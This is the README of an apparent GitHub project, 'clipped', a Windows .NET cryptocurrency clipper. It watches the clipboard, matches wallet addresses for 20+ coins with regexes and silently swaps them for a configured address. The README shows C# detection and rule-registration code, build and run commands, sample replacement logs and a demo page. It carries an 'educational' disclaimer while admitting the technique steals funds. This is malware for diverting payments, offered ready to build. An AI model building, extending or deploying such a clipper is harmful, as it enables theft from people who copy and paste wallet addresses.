# clipped /̵͇̿̿/’̿’̿ ̿̿ 📋 (Multi‑Crypto Clipper)

[![Target: .NET 4.0](https://img.shields.io/badge/.NET-4.0-blue)](https://learn.microsoft.com/dotnet/framework/)
[![Multi‑Crypto](https://img.shields.io/badge/crypto-20%2b_types-purple)](#supported-cryptocurrencies)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](#license)
[![Issues](https://img.shields.io/github/issues/TheCyberJest0r/Clipped_Multicoin-Clipper_Demo)](https://github.com/TheCyberJest0r/Clipped_Multicoin-Clipper_Demo/issues)
[![Stars](https://img.shields.io/github/stars/TheCyberJest0r/Clipped_Multicoin-Clipper_Demo?style=social)](https://github.com/TheCyberJest0r/Clipped_Multicoin-Clipper_Demo)

![BTC](https://img.shields.io/badge/BTC-orange?logo=bitcoin&logoColor=white)
![BCH](https://img.shields.io/badge/BCH-8dc351?logo=bitcoincash&logoColor=white)
![ETH](https://img.shields.io/badge/ETH-4b6ef5?logo=ethereum&logoColor=white)
![BNB](https://img.shields.io/badge/BNB-f3ba2f?logo=binance&logoColor=white)
![LTC](https://img.shields.io/badge/LTC-345d9d?logo=litecoin&logoColor=white)
![DOGE](https://img.shields.io/badge/DOGE-c2a633?logo=dogecoin&logoColor=white)
![SOL](https://img.shields.io/badge/SOL-14f195?logo=solana&logoColor=white)
![TRX](https://img.shields.io/badge/TRX-d9011b?logo=tron&logoColor=white)
![XRP](https://img.shields.io/badge/XRP-23292f?logo=xrp&logoColor=white)
![ADA](https://img.shields.io/badge/ADA-0033ad?logo=cardano&logoColor=white)
![DOT](https://img.shields.io/badge/DOT-e6007a?logo=polkadot&logoColor=white)
![DASH](https://img.shields.io/badge/DASH-008ce7?logo=dash&logoColor=white)
![ZEC](https://img.shields.io/badge/ZEC-f4b728?logo=zcash&logoColor=white)
![XMR](https://img.shields.io/badge/XMR-f26822?logo=monero&logoColor=white)
![XLM](https://img.shields.io/badge/XLM-14b5d1?logo=stellar&logoColor=white)
![EOS](https://img.shields.io/badge/EOS-191919?logo=eos&logoColor=white)
![NEO](https://img.shields.io/badge/NEO-00e599?logo=neo&logoColor=white)
![IOTA](https://img.shields.io/badge/IOTA-000000?logo=iota&logoColor=white)
![NANO](https://img.shields.io/badge/NANO-4a90e2?logo=nano&logoColor=white)
![ALGO](https://img.shields.io/badge/ALGO-000000?logo=algorand&logoColor=white)

Created by [@TheCyberJest0r](https://github.com/TheCyberJest0r)

> **Warning**  
> This project is for educational / demo purposes only.  
> Do **not** use it maliciously. Modifying clipboard contents without explicit user consent is unethical and may be illegal in your jurisdiction.

---

## Table of contents

- [Overview](#overview)
- [Architecture at a glance](#architecture-at-a-glance)
- [Supported Cryptocurrencies](#supported-cryptocurrencies)
- [Building & Running](#building--running)
- [HTML Demo (`demohtml`)](#html-demo-demohtml)
- [Status & tracking](#status--tracking)
- [License](#license)
- [Legal / Ethical](#legal--ethical)

---

## Overview

`clipped` is a **portable .NET 4.0 crypto clipper** (built as a .NET 4.0 console app) that:

- Monitors the clipboard for text.
- Detects whether the text looks like a crypto address.
- If it matches one of the supported formats, **replaces it** with a configured replacement string.
- Logs what it is doing to the console.

There is also a **visual HTML demo** (`demo.html`) that:

- Shows multiple wallet types (BTC, ETH, LTC, SOL, etc.).
- Lets you click to copy addresses and paste into a test area.
- Has a **liquid glass** UI, animated tab switcher, address detector, and floating logging terminal.

This is meant to help you **understand and test** how clipboard‑based address detection works.

---

## Architecture at a glance

```mermaid
flowchart LR
    subgraph App["clipped.exe"]
        Cb["Clipboard (Windows API)"]
        MatchEngine["Detection rules (BTC / ETH / LTC / ...)"]
        Replacer["Clipboard replacement"]
        Log["Console log"]
    end

    UserCopy["User copies address in any app"] --> Cb
    Cb --> MatchEngine
    MatchEngine -->|no match| Idle["Sleep & wait"]
    MatchEngine -->|rule match| Replacer
    Replacer --> CbUpdated["Clipboard now holds replacement string"]
    MatchEngine --> Log

    subgraph Demo["demo.html"]
        Tabs["Currency tabs (example addresses)"]
        Detector["JS detector (type guess)"]
        PasteBox["Paste area"]
    end

    Tabs -->|copy| Cb
    Cb --> Detector
    Detector --> PasteBox
```

---

## Supported Cryptocurrencies

The program currently has **rules for 20+ crypto types**. Each rule has:

- A **name** (e.g. `BTC`, `ETH`).
- A **regex** that approximates the address format.
- A **replacement string** that is written to the clipboard when a match is found.

### Implemented detection rules

> All regexes are **approximations**, tuned for demo use, not production‑grade validation.

The detection engine is just a small list of `Regex` rules wired up in `Program.cs`.  
Here’s a more colorful snapshot of how a few of them are defined and registered:

```csharp
// Regex patterns (simplified)
private static readonly Regex BtcRegex = new Regex(
    @"^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$", Compiled); // BTC

private static readonly Regex EthRegex = new Regex(
    @"^0x[a-fA-F0-9]{40}$", Compiled);                                  // ETH / EVM

private static readonly Regex SolRegex = new Regex(
    @"^[1-9A-HJ-NP-Za-km-z]{32,44}$", Compiled);                        // SOL (base58)

// ... plus LTC, DOGE, TRX, XRP, BNB, ADA, DOT, DASH, ZEC,
//     XMR, XLM, EOS, NEO, IOTA, NANO, ALGO ...

// Rule registration (first match wins)
static Program()
{
    Rules.Add(new CryptoRule("BTC",  BtcRegex,  BtcReplacement));
    Rules.Add(new CryptoRule("ETH",  EthRegex,  EthReplacement));
    Rules.Add(new CryptoRule("SOL",  SolRegex,  SolReplacement));
    // ... and one CryptoRule per supported network ...
}
```

And visually, the matching pipeline looks like this:

```mermaid
flowchart LR
    subgraph Engine["Regex rule engine"]
        BTC["BTC rule\n(BtcRegex)"]:::btc
        ETH["ETH rule\n(EthRegex)"]:::eth
        SOL["SOL rule\n(SolRegex)"]:::sol
        MORE["... more rules ..."]:::more
        BTC --> Rules
        ETH --> Rules
        SOL --> Rules
        MORE --> Rules
        Rules["Rules list\n(first match wins)"] --> Match["Matched crypto\n(name + replacement)"]
    end

    Clip["Clipboard text"] --> Engine
    Match --> Replace["Set clipboard to\nconfigured replacement"]

    classDef btc  fill:#f7931a,stroke:#111,color:#fff;
    classDef eth  fill:#4b6ef5,stroke:#111,color:#fff;
    classDef sol  fill:#14f195,stroke:#111,color:#111;
    classDef more fill:#6b7280,stroke:#111,color:#f9fafb;
```

For the exact, up‑to‑date patterns, check the `Regex` fields near the top of `Program.cs`.

---

## Building & Running

### Requirements

- Windows with **.NET Framework 4.0** (or later with compatibility).
- `csc` / Visual Studio / MSBuild.

### Build with the provided batch script

There is a `Build.bat` in the repo. From the `clipped` project directory:

```bat
Build.bat
```

This will compile `Program.cs` into `clipped.exe` using the `.csproj` configuration.

### Run

```bat
clipped.exe
```

You should see console logs like:

```text
[12:34:56.789] clipped starting (multi-crypto).
[12:35:01.234] BTC address detected, replacing.
[12:35:01.235] Clipboard set to BTC replacement.
```

Leave the console window open; the process must stay running to monitor the clipboard.

---

## HTML Demo (`demo.html`)

The `demo.html` file is a **standalone front‑end demo** for testing the idea:

- **Tabs** for different wallet types: BTC, ETH, LTC, SOL, and more.
- Each tab shows several **example addresses**; clicking a pill copies it to clipboard.
- A **paste area** and **detector** show:
  - Which crypto type the pasted text looks like.
  - A small icon per type.
- A **floating Windows‑style terminal** logs UI events and key presses.
- A **liquid glass** theme with:
  - Animated gradient orbs in the background.
  - Faint connector network that follows the mouse.
  - Smooth 3D tilt on the main card.

Use it by opening `demo.html` in a modern browser (Edge / Chrome / Firefox):

1. Click an example wallet address.
2. Paste into the demo paste area.
3. If `clipped.exe` is running, you can also paste into another app (e.g. Notepad) and see the replacement happen.

---


- If you use this pattern in real software, do it **with user consent** and for **legitimate** use‑cases (e.g., validating addresses before sending).

---

## License

This project is licensed under the **MIT License**.  
Copyright (c) 2026 [TheCyberJest0r](https://github.com/TheCyberJest0r).  
See the [`LICENSE`](LICENSE) file for full text.

---

## Legal / Ethical

This code demonstrates how clipboard‑based address detection and replacement works.  
Using these techniques without clear user permission can:

- Steal funds by silently changing destination addresses.
- Violate computer misuse laws.
- Get you banned from platforms or services.

**Use responsibly.** This repository is provided **as‑is, without warranty**, purely for learning and testing.

